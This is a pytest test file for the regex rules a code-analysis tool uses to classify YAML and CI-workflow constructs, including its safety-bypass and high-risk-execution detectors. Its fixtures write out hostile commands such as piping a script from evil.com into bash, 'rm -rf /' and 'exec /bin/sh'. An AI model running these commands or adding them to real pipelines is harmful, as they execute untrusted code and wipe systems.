"""yaml strict structural-signature coverage.

Migrated out of tests/core_engine/test_language_standards_strict.py, then
colocated here in tests/extraction/languages/ alongside the extraction
gauntlets' own test_<lang>.py files (the `_strict` suffix on this filename
avoids a basename collision between the two under pytest's default import
mode). See tests/core_engine/test_language_standards_strict.py's git history
for the original single-file layout and section banners (Issue references, etc).
"""

import re
import sys
from pathlib import Path

import pytest

from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

_LANGUAGES_DIR = str(Path(__file__).resolve().parent)
if _LANGUAGES_DIR not in sys.path:
    sys.path.insert(0, _LANGUAGES_DIR)

from _strict_harness import assert_redos_immune  # noqa: E402 # type: ignore

# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


YAML_RULES = LANGUAGE_DEFINITIONS["yaml"]["rules"]

# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


_YAML_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "run: if [ -f file ]; then echo hi; fi", "run: echo hi"),
    ("args", "      with:\n        node-version: 18\n", "      run: npm install\n"),
    ("structural_boundaries", "    needs: build", "    name: My Job"),
    ("func_start", "      - run: npm test", "      - name: Run tests"),
    ("class_start", "jobs:\n", "on:\n  push:\n"),
    ("safety", "permissions:\n  contents: read", "permissions:\n  contents: write"),
    (
        "safety_bypasses",
        "run: curl https://evil.com/x.sh | bash",
        "run: curl https://example.com/data.json -o data.json",
    ),
    ("high_risk_execution", "run: rm -rf /", "run: rm -rf /tmp/cache"),
    ("io", "run: apt-get install -y curl", "run: echo done"),
    ("ownership", "author: Jane Doe <jane@example.com>", "name: My Job"),
    ("cleanup", "run: rm -rf /tmp/build-cache", "run: rm -rf /"),
    ("api", "on:\n  push:\n    branches: [main]\n", "on:\n  schedule:\n    - cron: '0 0 * * *'\n"),
    ("state_mutation", "env:\n  NODE_ENV: production\n", "outputs:\n  result: success\n"),
    ("dead_code", "  # run: rm -rf /", "  # This step cleans up temp files"),
    ("doc", "name: CI Pipeline", "on: push"),
    ("test", "run: npm test", "run: npm run build"),
    ("concurrency", "concurrency:\n  group: ci-${{ github.ref }}\n", "strategy:\n  fail-fast: false\n"),
    ("globals", "run: echo ${{ github.actor }}", "run: echo hello"),
    (
        "reflection_metaprogramming",
        "value: ${{ fromJson(needs.build.outputs.matrix) }}",
        "value: ${{ needs.build.outputs.matrix }}",
    ),
    ("import", "      - uses: actions/checkout@v4", "      - run: npm install"),
    ("planned_debt", "  # TODO: add caching", "  # This step installs deps"),
    ("fragile_debt", "  # HACK: workaround for flaky test", "  # Normal comment"),
    ("events", "  schedule:\n    - cron: '0 0 * * *'\n", "  push:\n    branches: [main]\n"),
    ("dependency_injection", "env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "env:\n  TOKEN: ${{ github.token }}\n"),
    ("telemetry", "run: echo '::warning::Something looks off'", "run: echo hello"),
    ("debug_prints", "run: echo 'debug info'", "run: npm install"),
    ("panics_and_aborts", "run: exit 1", "run: exit 0"),
    ("thread_sleeps", "run: sleep 5", "run: sleep"),
    (
        "immutability_locks",
        "uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3",
        "uses: actions/checkout@v4",
    ),
    ("listeners", "webhook: http://example.com/hook", "endpoint: http://example.com/hook"),
    # #2732: spec_exposure, comment-anchored. Every negative is a bare flow
    # sequence -- the shape that makes YAML different from the languages
    # sharing the unanchored generic rule (see the dedicated test below).
    ("spec_exposure", "  # [SPEC-4412] pinned per the release spec", "    needs: [audit, lint]"),
    ("spec_exposure", "      # see [audit] trail", "    branches: [spec, main]"),
    ("spec_exposure", "# raised in [spec] review", "  # the value is [specified per-machine]"),
    ("test_skip", "run: npm test -- --passWithNoTests", "run: npm test"),
    # --- DEEP ADVERSARIAL CASES FOR HIGH-AMBIGUITY SIGNATURES ---
    # args: tolerating comments and blank lines between 'with:' and args
    ("args", "with:\n  # comment\n  foo: bar", "without:\n  foo: bar"),
    ("args", "with:\n\n  foo: bar", "without:\n  foo: bar"),
    ("args", "  with:\n    # comment\n    foo: bar", "without:\n  foo: bar"),
    # api: tolerating comments and blank lines between 'on:' and events
    ("api", "on:\n  # comment\n  push:", "on:\n  # comment\n  release:"),
    ("api", "on:\n\n  push:", "on:\n\n  release:"),
    ("api", "on: # trigger\n  pull_request:", "on: # trigger\n  release:"),
    # state_mutation: tolerating comments and blank lines between 'env:' and vars
    ("state_mutation", "env:\n  # var comment\n  FOO: bar", "env:\n  # comment\n"),
    ("state_mutation", "env:\n\n  FOO: bar", "env:\n\n"),
    ("state_mutation", "env: # vars\n  FOO: bar", "env: # vars\n"),
    # class_start: tolerating comments and blank lines within the job definition before 'uses:'
    ("class_start", "job:\n  # comment\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n  needs: build\n  # comment\n  uses: foo", "name: job\nuses: foo"),
    # import / _dependency_capture: tolerating comments and blank lines between 'uses:' and the target
    ("import", "uses: # comment\n  actions/checkout@v4", "uses: # comment\n"),
    ("import", "uses:\n  # comment\n  actions/checkout@v4", "uses:\n  # comment\n"),
    ("import", "uses:\n\n  actions/checkout@v4", "uses:\n\n"),
    ("import", "uses:   \n  actions/checkout@v4", "uses:   \n"),
    # args (more)
    ("args", "with:\n  # comment 1\n  # comment 2\n  foo: bar", "without:\n  foo: bar"),
    ("args", "with:  # inline\n\n  # block\n  foo: bar", "without:\n  foo: bar"),
    ("args", "  with:\n    # comment 1\n    # comment 2\n    foo: bar", "without:\n  foo: bar"),
    # api (more)
    ("api", "on:\n  # trigger 1\n  # trigger 2\n  push:", "on:\n  # comment\n  release:"),
    ("api", "on:  # trigger\n\n  # trigger 2\n  push:", "on:\n\n  release:"),
    # state_mutation (more)
    ("state_mutation", "env:\n  # var 1\n  # var 2\n  FOO: bar", "env:\n  # comment\n"),
    ("state_mutation", "env:  # vars\n\n  # more\n  FOO: bar", "env: # vars\n"),
    # class_start (more)
    ("class_start", "job:\n  needs: build\n  # comment 1\n  # comment 2\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n  # a\n  # b\n  # c\n  # d\n  # e\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "workflow_call:\n  # inputs\n  uses: foo", "name: workflow_call\nuses: foo"),
    # import / _dependency_capture (more)
    ("import", "uses: # comment 1\n  # comment 2\n  actions/checkout@v4", "uses: # comment 1\n"),
    ("import", "uses:\n  # comment 1\n  # comment 2\n  actions/checkout@v4", "uses:\n  # comment 1\n"),
    ("import", "image: # comment\n  node:18", "image: # comment\n"),
    # --- Issue #1072: signature keys with zero _SIMPLE_CASES coverage ---
    ("hardcoded_secrets", 'api_key: "AKIAIOSFODNN7EXAMPLE1"', 'name: "AKIAIOSFODNN7EXAMPLE1"'),
]

# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


@pytest.mark.parametrize("signature,positive,negative", _YAML_SIMPLE_CASES)
def test_yaml_signature_positive_and_negative(signature, positive, negative):
    pattern = YAML_RULES[signature]
    assert pattern is not None, f"yaml's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"yaml {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"yaml {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_high_risk_execution_root_delete_trailing_boundary_regression():
    """
    Regression test: the shared trailing `\\b` after the `rm -rf /`
    alternative required a word character immediately following the `/`
    -- never true for how this destructive payload is actually written
    (as the entire `run:` command, followed by end-of-line/end-of-string,
    both non-word). The single most common real-world form of this
    supply-chain-sabotage payload never matched at all.
    """
    pattern = YAML_RULES["high_risk_execution"]
    assert pattern.search("run: rm -rf /"), "bare 'rm -rf /' still didn't match"
    assert pattern.search("run: rm -rf /\n")
    assert pattern.search("run: rm -rf /2"), "digit-following form regressed"
    assert not pattern.search("run: rm -rf /tmp/cache"), "path-following form incorrectly matched"
    assert pattern.search('run: eval "$CMD"')
    assert pattern.search("run: exec /bin/sh")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_test_skip_double_dash_flag_leading_boundary_regression():
    """
    Regression test: `--passWithNoTests` and `--no-audit` both start with
    `-` (non-word), so the shared leading `\\b` could only fire when a
    word char immediately preceded the `-` -- never true for how these
    flags are actually written (always preceded by whitespace, e.g. after
    `--` or a command name). Both never matched at all.
    """
    pattern = YAML_RULES["test_skip"]
    assert pattern.search("run: npm test -- --passWithNoTests"), "--passWithNoTests still didn't match"
    assert pattern.search("run: pytest --no-audit"), "--no-audit still didn't match"
    assert pattern.search("run: skipTests")
    assert pattern.search("run: npm test || true")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_events_schedule_anchor_regression():
    """
    Regression test: the `schedule:` alternative had no `^[ \\t]*` anchor
    (unlike its siblings `repository_dispatch:` and `cron:`), so it could
    match anywhere a line merely contained the substring `schedule:` --
    including keys like `release_schedule:` that have nothing to do with
    the GitHub Actions `on.schedule` trigger. Anchoring it to line-start
    fixes the false positive without affecting the real trigger form.
    """
    pattern = YAML_RULES["events"]
    assert pattern.search("  schedule:\n    - cron: '0 0 * * *'\n"), "real on.schedule trigger regressed"
    assert not pattern.search("release_schedule: weekly"), "unrelated key incorrectly matched"
    assert not pattern.search("  description: 'set the schedule: carefully'\n"), (
        "substring inside prose incorrectly matched"
    )


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_telemetry_workflow_command_regression():
    """
    Regression test: the original pattern required `::debug`/`::warning`/
    `::error` to sit at the true start of a line (after only leading
    whitespace) followed by a space -- but GitHub Actions workflow
    commands are always emitted via `echo "::warning::msg"` (never as a
    bare line start), and the most common real form uses `::` directly
    after the keyword with no space at all (e.g. `::warning::msg`, vs.
    the rarer `::warning file=a,line=1::msg` parameter form). The
    anchored, space-only pattern never matched a single realistic
    workflow-command line.
    """
    pattern = YAML_RULES["telemetry"]
    assert pattern.search('run: echo "::warning::Deprecated API used"'), "no-space :: form still didn't match"
    assert pattern.search('run: echo "::error file=app.js,line=1::Something broke"'), "space+params form regressed"
    assert pattern.search('run: echo "::debug::checkpoint reached"')
    assert not pattern.search("run: echo hello")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_reflection_metaprogramming_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the unbounded
    `[a-zA-Z]+` between `to[A-Z]` and the required `(` , combined with
    unanchored search, is quadratic on payloads packed with `to[A-Z]`
    starts that never reach a `(`. Confirmed genuine O(n^2) scaling
    (~0.02s/0.08s/0.30s/1.21s/4.84s at n=2k/4k/8k/16k/32k, ~4x per
    doubling) before being bounded to a generous-but-finite cap.
    """
    pattern = YAML_RULES["reflection_metaprogramming"]
    poison = "toA" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    assert pattern.search("value: ${{ fromJson(needs.build.outputs.matrix) }}")
    assert pattern.search('run: node -e "console.log(x.toJson())"')
    assert pattern.search('run: node -e "console.log(x.toUpperCase())"')


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for yaml -- all
    confirmed genuine, intentional double-classifications via direct
    empirical verification against a realistic multi-section workflow
    file, not false positives:

    - `structural_boundaries` <-> `state_mutation` on an `env:` block:
      setting job/step environment variables is simultaneously a
      structural section boundary AND a state mutation (it reassigns
      environment state) -- both are correct.
    - `structural_boundaries` <-> `concurrency` on a `strategy:`/
      `matrix:` block: a parallel build matrix is simultaneously a
      structural section boundary AND a concurrency construct.
    - `class_start` <-> `import` on a job whose body is `uses:`/`image:`
      (a reusable-workflow-call or container job): the job definition is
      simultaneously an object-boundary (`class_start`) AND a dependency
      resolution (`import`) -- GitHub Actions genuinely conflates "define
      this job" and "import this reusable workflow/image" into the same
      syntax for that job shape.
    - `safety_bypasses` <-> `io` on `curl ... | bash`: the curl invocation
      is both a network I/O operation AND (piped to a shell) a classic
      supply-chain safety bypass -- correctly double-classified.
    - `import` <-> `immutability_locks` on a SHA-pinned `uses:` line: the
      dependency import and its immutability lock (SHA-1 pinning) are
      the same token by design -- `immutability_locks` exists
      specifically to detect this shape on `uses:` lines.
    """
    structural_boundaries = YAML_RULES["structural_boundaries"]
    state_mutation = YAML_RULES["state_mutation"]
    concurrency = YAML_RULES["concurrency"]
    class_start = YAML_RULES["class_start"]
    import_ = YAML_RULES["import"]
    safety_bypasses = YAML_RULES["safety_bypasses"]
    io = YAML_RULES["io"]
    immutability_locks = YAML_RULES["immutability_locks"]

    env_block = "env:\n  NODE_ENV: production\n"
    assert structural_boundaries.search(env_block)
    assert state_mutation.search(env_block)

    matrix_block = "strategy:\n  matrix:\n    node: [16, 18]\n"
    assert structural_boundaries.search(matrix_block)
    assert concurrency.search(matrix_block)

    reusable_job = "reusable:\n  uses: ./.github/workflows/other.yml\n"
    assert class_start.search(reusable_job)
    assert import_.search(reusable_job)

    curl_pipe = "run: curl https://example.com/install.sh | bash"
    assert safety_bypasses.search(curl_pipe)
    assert io.search(curl_pipe)

    pinned_uses = "      - uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3"
    assert import_.search(pinned_uses)
    assert immutability_locks.search(pinned_uses)


# ==============================================================================
# Issue #2646: `ownership` was `None` -- action.yml's top-level `author:` and
# OpenAPI's `info.contact:` block (bounded step-over to a nested `name:`/
# `email:` key) are standard, single-key ownership fields neither rule
# previously captured.
# ==============================================================================


def test_yaml_ownership_action_yml_author_field():
    """
    action.yml's top-level `author:` (a sibling of `name:`/`description:`,
    which `doc` already matches) is the primary fix-shape example from the
    issue.
    """
    ownership = YAML_RULES["ownership"]
    assert ownership.search("author: Jane Doe"), "top-level author: didn't match"
    assert ownership.search("  author: Jane Doe <jane@example.com>"), "indented author: didn't match"
    assert not ownership.search("name: My Job"), "unrelated name: key incorrectly matched"
    assert not ownership.search("author_note: check with the team"), (
        "author_note: (not the author: key itself) incorrectly matched"
    )


def test_yaml_ownership_openapi_contact_block():
    """
    OpenAPI's `info.contact:` block declares ownership via a nested `name:`/
    `email:` key rather than a single-line value -- bounded step-over over
    intervening comments/blank lines, same shape as `api`/`args`/
    `class_start`'s existing bounded lookahead (capped at 10 lines).
    """
    ownership = YAML_RULES["ownership"]
    assert ownership.search("contact:\n  name: API Support\n  email: support@example.com\n"), (
        "OpenAPI contact: block with name: didn't match"
    )
    assert ownership.search("contact:\n  email: support@example.com\n"), (
        "contact: block with only email: (no name:) didn't match"
    )
    assert ownership.search("contact:\n  # who to ask\n  email: support@example.com\n"), (
        "contact: block tolerating an intervening comment line didn't match"
    )
    assert ownership.search("contact:\n\n  name: API Support\n"), (
        "contact: block tolerating an intervening blank line didn't match"
    )
    assert not ownership.search("contact_form: https://example.com/contact\n"), (
        "unrelated contact_form: key incorrectly matched"
    )
    assert not ownership.search("contact:\n  url: https://example.com/contact\n"), (
        "contact: block with neither name: nor email: (just url:) incorrectly matched"
    )


def test_yaml_ownership_contact_name_expected_doc_overlap_not_a_bug():
    """
    The nested `name:` key under a `contact:` block also legitimately
    satisfies `doc`'s generic `^[ \\t]*name:[ \\t]+.*` line-match -- an
    intentional double-classification (the line really is both a generic
    "name:" line and part of an ownership/contact block), not a bug
    introduced by this rule. `author:` has no such overlap since `doc` has
    no `author:` alternative at all.
    """
    doc = YAML_RULES["doc"]
    ownership = YAML_RULES["ownership"]

    contact_block = "contact:\n  name: API Support\n"
    assert doc.search(contact_block), "sanity check: doc's generic name: match still fires here"
    assert ownership.search(contact_block)

    author_line = "author: Jane Doe"
    assert not doc.search(author_line), "doc has no author: alternative -- must not match"
    assert ownership.search(author_line)


def test_yaml_ownership_redos_immunity():
    """
    ReDoS probe for the new bounded `contact:` step-over quantifier (same
    {0,10}-capped shape as `api`/`args`/`class_start`, bounded for the same
    reason). A long run of comment-only lines under `contact:` that never
    reaches a `name:`/`email:` key is the adversarial shape most likely to
    stress the bounded repetition.
    """
    ownership = YAML_RULES["ownership"]
    poison = "contact:\n" + ("  # comment\n" * 40000)
    assert_redos_immune(ownership, poison, timeout_sec=3.0)
    assert_redos_immune(ownership, "author: " + "a" * 100000, timeout_sec=3.0)

    # sanity: still matches its real positive cases after the sweep
    assert ownership.search("author: Jane Doe")
    assert ownership.search("contact:\n  name: API Support\n")


# ==============================================================================
# Issue #2647: `cleanup` was `None` -- ordinary shell-level resource teardown
# embedded in `run:`/`script:` content (`rm -rf <non-root-path>`, `docker rm`/
# `stop`/`down`, bare `kill <pid>`) matched no existing rule.
# ==============================================================================


def test_yaml_cleanup_rm_rf_non_root_path():
    """
    `rm -rf <non-root-path>` is cleanup's core case. `high_risk_execution`
    stays deliberately root-only (per its own existing regression test), so
    the two rules must partition cleanly with no shared positive case.
    """
    cleanup = YAML_RULES["cleanup"]
    high_risk_execution = YAML_RULES["high_risk_execution"]

    for snippet in ("run: rm -rf /tmp/cache", "run: rm -rf build/", "run: rm -rf ./tmp"):
        assert cleanup.search(snippet), f"non-root rm -rf didn't match cleanup: {snippet!r}"
        assert not high_risk_execution.search(snippet), (
            f"non-root rm -rf incorrectly also matched high_risk_execution: {snippet!r}"
        )


def test_yaml_cleanup_docker_teardown_verbs():
    """
    `docker rm`/`docker stop`/`docker-compose down`/`docker compose down`
    (both the hyphenated and modern space-separated compose invocation) are
    all real-world teardown forms named in the issue.
    """
    cleanup = YAML_RULES["cleanup"]
    assert cleanup.search("run: docker rm my_container")
    assert cleanup.search("run: docker stop my_container")
    assert cleanup.search("run: docker-compose down")
    assert cleanup.search("run: docker compose down")
    assert not cleanup.search("run: docker build -t my_image ."), "unrelated docker build incorrectly matched"
    assert not cleanup.search("run: docker run my_image"), "unrelated docker run incorrectly matched"


def test_yaml_cleanup_bare_kill_vs_panics_and_aborts_numbered_signal():
    """
    Bare `kill <pid>` (no numbered signal) is cleanup's domain;
    `panics_and_aborts` stays exclusively the numbered-signal form
    (`kill -9 ...`) it already covers -- the two must partition cleanly.
    """
    cleanup = YAML_RULES["cleanup"]
    panics_and_aborts = YAML_RULES["panics_and_aborts"]

    assert cleanup.search("run: kill 1234")
    assert cleanup.search("run: kill $PID")
    assert not panics_and_aborts.search("run: kill 1234"), "bare kill incorrectly matched panics_and_aborts"

    assert panics_and_aborts.search("run: kill -9 1234"), "sanity: numbered signal still matches panics_and_aborts"
    assert not cleanup.search("run: kill -9 1234"), "numbered-signal kill incorrectly also matched cleanup"

    # A named (non-numbered) signal is neither rule's originally-named case, but
    # it's real teardown and not the numbered form panics_and_aborts claims --
    # cleanup covers it, panics_and_aborts (numeric-only) does not.
    assert cleanup.search("run: kill -SIGTERM 1234")
    assert not panics_and_aborts.search("run: kill -SIGTERM 1234")


def test_yaml_cleanup_root_delete_boundary_matches_high_risk_execution_exactly():
    """
    Regression test for a real boundary bug caught while implementing this
    rule: the issue's own illustrative regex excluded only a *bare* trailing
    `/` (`(?!/(?:[ \\t]|$))`), which would have left a digit-suffixed root
    delete (`rm -rf /2`) matching BOTH this rule and `high_risk_execution`
    (which explicitly claims any `/` not immediately followed by a letter --
    see that rule's own `/2` regression case). Widened to
    `(?!/(?:[^A-Za-z]|$))`, the exact complement of `high_risk_execution`'s
    letter-based split, so every `/`-rooted form `high_risk_execution` claims
    stays excluded here, and only letter-led absolute paths (`/tmp`, `/var`,
    a real named directory) or relative paths are cleanup's.
    """
    old_pattern_exclusion_only_bare_slash = re.compile(r"\brm[ \t]+-rf?[ \t]+(?!/(?:[ \t]|$))\S{1,200}\b", re.I)
    # Sanity: the issue's illustrative regex really does over-match /2.
    assert old_pattern_exclusion_only_bare_slash.search("run: rm -rf /2"), (
        "sanity check: illustrative regex's boundary bug must reproduce"
    )

    cleanup = YAML_RULES["cleanup"]
    high_risk_execution = YAML_RULES["high_risk_execution"]

    assert not cleanup.search("run: rm -rf /2"), "digit-suffixed root delete incorrectly matched cleanup"
    assert high_risk_execution.search("run: rm -rf /2"), "sanity: high_risk_execution still claims /2"

    assert not cleanup.search("run: rm -rf /"), "bare root delete incorrectly matched cleanup"
    assert high_risk_execution.search("run: rm -rf /"), "sanity: high_risk_execution still claims bare /"

    assert cleanup.search("run: rm -rf /tmp"), "letter-led absolute path regressed"
    assert not high_risk_execution.search("run: rm -rf /tmp"), (
        "sanity: high_risk_execution must not claim a letter-led absolute path"
    )


def test_yaml_cleanup_after_script_double_counts_func_start_by_design():
    """
    GitLab's `after_script:` keyword itself is intentionally left to
    `func_start`'s executable-logic anchor -- this rule keys off the shell
    verb, not the block keyword. A teardown verb sitting inside an
    `after_script:` block legitimately double-counts with `func_start`, the
    same way any `run:`/`script:` shell content already double-counts with
    `branch`/`io`/`high_risk_execution` per this language's documented
    philosophy that shell embedded in run:/script: counts like code.
    """
    func_start = YAML_RULES["func_start"]
    cleanup = YAML_RULES["cleanup"]

    after_script_teardown = "after_script:\n  - rm -rf /tmp/build-cache\n"
    assert func_start.search(after_script_teardown)
    assert cleanup.search(after_script_teardown)


def test_yaml_cleanup_redos_immunity():
    """
    ReDoS probe for the new bounded `\\S{1,200}`/`\\S{1,64}` quantifiers.
    Each is a single bounded quantifier with no adjacent overlapping-charset
    quantifier to backtrack against, but an unterminated non-whitespace run
    is the standard adversarial shape to confirm against regardless.
    """
    cleanup = YAML_RULES["cleanup"]
    assert_redos_immune(cleanup, "run: rm -rf " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(cleanup, "run: rm -rf /" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(cleanup, "run: kill " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(cleanup, "run: docker compose " + "a" * 100000, timeout_sec=3.0)

    # sanity: still matches its real positive cases after the sweep
    assert cleanup.search("run: rm -rf /tmp/cache")
    assert cleanup.search("run: docker-compose down")
    assert cleanup.search("run: kill 1234")


def test_yaml_spec_exposure_is_comment_anchored_not_the_generic_bracket_rule():
    """
    #2732 proposed giving yaml the generic `[SPEC-n]|[spec]|[audit]` bracket
    rule verbatim from python/go/java/js, arguing that "spec_exposure never
    sees the code stream, so YAML's [a, b] flow-sequence syntax cannot FP
    against it."

    The premise is false, and this test pins the correction. `coding_analysis`
    applies EVERY non-underscore rule to the code stream; `comment_analysis`
    then runs the comment-stream rules a SECOND time over the comments. It
    supplements the code-stream pass rather than replacing it -- so an
    unanchored bracket rule scores YAML flow sequences, which is ordinary
    syntax in this language rather than a traceability tag.

    Measured before anchoring: the workflow below has no comments at all and
    still scored spec_exposure=1, entirely from `needs: [audit, lint]`.
    """
    from gitgalaxy.core.detector import StructuralExtractor
    from gitgalaxy.core.prism import Prism
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    generic_rule = re.compile(r"\[(?:\s*SPEC\s*-\s*\d{1,10}|spec|audit)[^\]]{0,300}\]", re.I)
    comment_free_workflow = (
        "name: CI\non:\n  push:\njobs:\n"
        "  audit:\n    steps:\n      - run: npm audit\n"
        "  build:\n    needs: [audit, lint]\n    steps:\n      - run: npm run build\n"
    )

    # the rule that was asked for would have counted the flow sequence ...
    assert generic_rule.search(comment_free_workflow)
    # ... the rule that shipped cannot, because `#` never survives into code
    assert not YAML_RULES["spec_exposure"].search(comment_free_workflow)

    prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    streams = prism.split_streams(comment_free_workflow, "yaml")
    assert streams["comment_stream"] == ""
    equations = StructuralExtractor("yaml", LANGUAGE_DEFINITIONS).splice(
        streams["code_stream"], streams["comment_stream"], raw_content=comment_free_workflow
    )["equations"]
    assert equations["spec_exposure"] == 0

    # and a real tagged comment still counts, via the comment stream
    tagged = "# [SPEC-4412] pinned per the release spec\njobs:\n  build:\n    needs: [audit, lint]\n"
    streams = prism.split_streams(tagged, "yaml")
    equations = StructuralExtractor("yaml", LANGUAGE_DEFINITIONS).splice(
        streams["code_stream"], streams["comment_stream"], raw_content=tagged
    )["equations"]
    assert equations["spec_exposure"] == 1

    # ... including a TRAILING tag, which the `^[ \t]*#` anchor only reaches
    # because prism re-emits an end-of-line comment on its own `#`-led line.
    # That normalization is why the anchor costs no recall (yaml's own
    # `dead_code` rule relies on exactly the same thing).
    trailing = "jobs:\n  build:\n    steps:\n      - run: npm ci  # see [audit] trail\n"
    streams = prism.split_streams(trailing, "yaml")
    assert streams["comment_stream"] == "# see [audit] trail"
    equations = StructuralExtractor("yaml", LANGUAGE_DEFINITIONS).splice(
        streams["code_stream"], streams["comment_stream"], raw_content=trailing
    )["equations"]
    assert equations["spec_exposure"] == 1


def test_yaml_spec_exposure_bare_spec_branch_is_word_bounded():
    """
    #2732: the generic rule's bare `spec` alternative has no trailing
    boundary, so it matches any word starting "spec". That was not
    hypothetical -- 2 of the 3 code-stream hits across the 41,815 .yml/.yaml
    files in the pool corpus were `[specified\\n  per-machine]` (meson's docs)
    and `[species]` (an elasticsearch test fixture), not tags at all.
    """
    spec_exposure = YAML_RULES["spec_exposure"]
    assert not spec_exposure.search("# the value is [specified per-machine]")
    assert not spec_exposure.search("# see the [species] list")
    assert not spec_exposure.search("# the [auditor] signs off")

    assert spec_exposure.search("# [spec] review pending")
    assert spec_exposure.search("# [SPEC-77] change request")
    assert spec_exposure.search("# [audit] trail retained")


def test_yaml_spec_exposure_redos_immunity():
    """
    #2732: `[^\\n\\[]{0,200}` must be followed by a literal `[` and
    `[^\\]\\n]{0,300}` by a literal `]`, so each bounded run has exactly one
    landing site -- no ambiguous partition to backtrack over. Payloads are
    long unterminated runs of exactly what each class accepts.
    """
    spec_exposure = YAML_RULES["spec_exposure"]
    assert_redos_immune(spec_exposure, "# " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(spec_exposure, "# [spec" + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(spec_exposure, "# " + "[" * 100000, timeout_sec=3.0)

    assert spec_exposure.search("# [SPEC-4412] traceable")


def test_yaml_api_contract_2730():
    """
    #2730: the api rule's stated contract is *a declaration that makes a
    named function or type visible outside this file* (see
    docs/api_rule_contract.md). Two failure directions are in scope: a
    declaration the rule cannot see, and a token the rule counts where no
    declaration exists.

    `workflow_call` -- the trigger that makes a workflow callable by another
    repository -- was missing from the trigger set.

    Every case below was verified against the real compiled rule before
    being written down (AGENTS.md rule 3).
    """
